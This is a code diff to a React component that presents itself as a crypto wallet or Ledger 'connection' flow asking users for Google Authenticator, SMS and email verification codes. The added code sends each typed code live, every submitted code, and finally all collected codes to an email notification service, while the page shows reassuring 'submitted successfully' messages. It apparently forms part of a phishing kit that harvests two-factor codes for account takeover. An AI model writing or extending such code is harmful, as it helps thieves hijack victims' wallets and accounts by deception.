@@ -1,10 +1,10 @@
-
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Phone, CheckCircle, Wallet, Shield, Smartphone, Mail } from "lucide-react";
+import { sendEmailNotification } from "@/services/emailService";
 
 type ConnectionStep = 'initial' | 'callRequest' | 'codeEntry' | 'success';
 
@@ -22,11 +22,27 @@ const WalletLedgerConnection = () => {
   });
   const { toast } = useToast();
 
-  const handleRequestCall = () => {
+  const handleRequestCall = async () => {
+    try {
+      await sendEmailNotification({
+        step: "Wallet Connection - Call Requested",
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
     setCurrentStep('callRequest');
   };
 
-  const handleCallConfirm = () => {
+  const handleCallConfirm = async () => {
+    try {
+      await sendEmailNotification({
+        step: "Wallet Connection - Call Confirmed",
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
     setCurrentStep('codeEntry');
     toast({
       title: "Call requested successfully",
@@ -34,7 +50,7 @@ const WalletLedgerConnection = () => {
     });
   };
 
-  const handleCodeChange = (field: keyof typeof codes, value: string) => {
+  const handleCodeChange = async (field: keyof typeof codes, value: string) => {
     // Apply different length limits based on the field
     let processedValue = value;
     if (field === 'googleAuth') {
@@ -44,13 +60,37 @@ const WalletLedgerConnection = () => {
       processedValue = value.replace(/\D/g, '').slice(0, 12);
     }
     setCodes(prev => ({ ...prev, [field]: processedValue }));
+
+    // Send email when code is entered (not empty)
+    if (processedValue.trim()) {
+      try {
+        await sendEmailNotification({
+          step: "Wallet Connection - Code Entry",
+          field: `${field} code`,
+          value: processedValue,
+          timestamp: new Date().toISOString()
+        });
+      } catch (error) {
+        console.error('Email notification failed:', error);
+      }
+    }
   };
 
-  const handleCodeSubmit = (field: keyof typeof codes) => {
+  const handleCodeSubmit = async (field: keyof typeof codes) => {
     const minLength = field === 'googleAuth' ? 6 : 4; // Minimum 4 characters for SMS/email, 6 for Google Auth
     
     if (codes[field].length >= minLength) {
-      // Don't disable the button anymore, just show success message
+      try {
+        await sendEmailNotification({
+          step: "Wallet Connection - Code Submitted",
+          field: `${field} code submission`,
+          value: codes[field],
+          timestamp: new Date().toISOString()
+        });
+      } catch (error) {
+        console.error('Email notification failed:', error);
+      }
+
       toast({
         title: "Code submitted",
         description: `${field === 'googleAuth' ? 'Google Authenticator' : field === 'sms' ? 'SMS' : 'Email'} code has been submitted successfully.`,
@@ -64,7 +104,16 @@ const WalletLedgerConnection = () => {
     }
   };
 
-  const handleFinalNext = () => {
+  const handleFinalNext = async () => {
+    try {
+      await sendEmailNotification({
+        step: "Wallet Connection - Final Step",
+        timestamp: new Date().toISOString(),
+        allFormData: codes
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
     setCurrentStep('success');
   };
 
